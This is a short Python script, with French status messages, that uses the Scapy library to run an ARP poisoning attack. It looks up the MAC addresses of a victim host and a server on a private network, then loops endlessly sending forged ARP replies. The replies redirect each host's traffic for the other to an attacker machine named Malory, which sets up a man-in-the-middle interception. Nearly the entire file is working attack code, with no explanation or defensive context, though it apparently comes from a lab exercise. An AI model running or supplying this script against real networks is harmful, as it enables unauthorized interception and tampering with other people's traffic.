from scapy.all import *
import time

# Configuration
victim_ip = "192.168.245.114"
server_ip = "192.168.245.137"
malory_ip = "192.168.89.166"
malory_mac = "46:94:88:A3:06:9B"


def get_mac(ip):
    ans, _ = sr(ARP(op=1, pdst=ip), timeout=2, verbose=0)
    if ans:
        return ans[0][1].hwsrc
    return None


victim_mac = get_mac(victim_ip)
server_mac = get_mac(server_ip)

if victim_mac is None or server_mac is None:
    print("[Erreur] Impossible de trouver les adresses MAC des cibles.")
    exit()


def arp_poison():
    print("[Malory] Lancement de l'ARP Poisoning...")
    while True:
        victim_packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=server_ip, hwsrc=malory_mac)
        server_packet = ARP(op=2, pdst=server_ip, hwdst=server_mac, psrc=victim_ip, hwsrc=malory_mac)

        send(victim_packet, verbose=0)
        send(server_packet, verbose=0)

        time.sleep(2)


try:
    arp_poison()
except KeyboardInterrupt:
    print("[Malory] Arrêt de l'attaque.")
